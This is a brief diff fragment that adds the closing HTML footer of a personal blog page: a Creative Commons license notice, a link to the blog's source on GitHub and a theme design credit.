+        <a href="http://creativecommons.org/licenses/by-sa/4.0/"
+            title="Share, adapt, use.        But mention the author and keep the same license">Creative Commons Attribution 4.0</a> License.
+
+        The source code is available on <a href="https://github.com/maggick/blog/" title="Contribute through GitHub">GitHub</a>.
+    </p>
+</div>
+
+<div class="pure-u-1-3 credits">
+    <p class="l-box">
+        Design by <a href="http://www.templateify.com/" title="Maggner Theme">Templateify</a>.
+    </p>
+</div>    </section>
+
+
+</div>
+</body>
+</html>
